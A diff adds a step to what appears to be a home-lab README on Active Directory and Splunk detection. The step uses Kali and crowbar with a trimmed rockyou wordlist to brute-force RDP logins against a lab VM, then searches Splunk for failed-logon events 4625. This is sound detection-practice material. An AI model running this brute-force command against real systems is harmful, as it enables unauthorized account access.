@@ -239,3 +239,33 @@ At the end, if you install Sysmon and the Splunk Forwarder on the target VM, you
    ![User Authentication](https://github.com/user-attachments/assets/1456f9ac-4ca8-4c63-bd0f-b05b8fea5459)
 
 ## Step6: Generate brute force attack using Kali linux
+- change ip address to 192.168.10.250/24 192.168.10.1 8.8.8.8 disconnect ad connect to take the change
+![image](https://github.com/user-attachments/assets/8752f917-1740-401e-921a-46cbb7817524)
+
+- upgrade repo : sudo apt-get update & sudo apt-get upgrade
+- create a new repo : mkdir ad-project
+- install crowbar:  sudo apt-get install -y crowbar
+- sudo gunzip /usr/sharewordlists/rockyou
+- cp rockyou ad-project
+- using just first 20 passwords : head -n 20 rockyou.txt > password.txt and at the end the correct passwords
+  ![image](https://github.com/user-attachments/assets/e33b5931-d2b3-4fd8-982d-d699660efb99)
+
+- allow remote connection for both users on target machine
+- Brute force attack : crowbar -u user(tsmith) -b rdp -C password.txt -s 192.168.10.100/32
+- view telemetry via splunk : index=endpoint tsmith go to eventcode and multiple with 4625 (failed log on)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
